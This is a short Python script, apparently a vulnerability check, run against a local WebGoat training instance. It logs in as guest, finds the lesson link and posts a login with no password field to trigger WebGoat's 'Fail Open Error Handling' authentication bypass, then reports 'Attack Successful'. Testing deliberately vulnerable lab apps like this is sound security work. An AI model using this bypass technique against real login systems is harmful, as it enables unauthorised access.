import os
import requests
import json

def main():
	s = requests.Session()
	r = s.get("http://127.0.0.1:8080/WebGoat")
	payload = {'username': 'guest', 'password': 'guest'}
	r1 = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", payload)
	r2 = s.get("http://127.0.0.1:8080/WebGoat/attack?Screen=193&menu=1000")
	r3 = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
	loaded_json = json.loads(r3.text)
	dynamic_url = loaded_json[9]['children'][0]['link']
	payload = {'Username': 'webgoat', 'SUBMIT':'Login'}
	r4 = s.post("http://127.0.0.1:8080/WebGoat/" + dynamic_url, payload)

	if "You have been authenticated with Fail Open Error Handling" in r4.text:
		print("Attack Successful")
		return 1
	else:
		print("vuln-10 not present")
		return 0

main()

